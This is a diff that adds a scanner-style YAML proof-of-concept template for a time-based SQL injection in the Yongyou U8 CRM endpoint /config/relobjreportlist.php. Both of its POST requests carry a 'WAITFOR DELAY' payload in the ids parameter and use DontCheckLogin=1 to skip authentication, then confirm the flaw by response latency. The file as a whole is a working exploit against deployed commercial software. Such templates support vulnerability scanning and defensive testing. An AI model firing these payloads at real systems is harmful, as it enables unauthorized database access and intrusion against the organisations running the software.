@@ -1,0 +1,31 @@
+name: poc-yaml-yongyouU8-CRM-relobjreportlist.php-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /config/relobjreportlist.php
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID=bgsesstimeout-;
+      body: DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY '0:0:4'--
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: POST
+      path: /config/relobjreportlist.php
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID=bgsesstimeout-;
+      body: DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY '0:0:8'--
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487514&idx=1&sn=3579b784d4504acc72dff5a3e1b5b6f6&chksm=c267a529f5102c3f8ab2ab72c2faee53b74f73ad21962840b375fd82d52ae8abacbb5a41af6c&token=1439003696&lang=zh_CN#rd
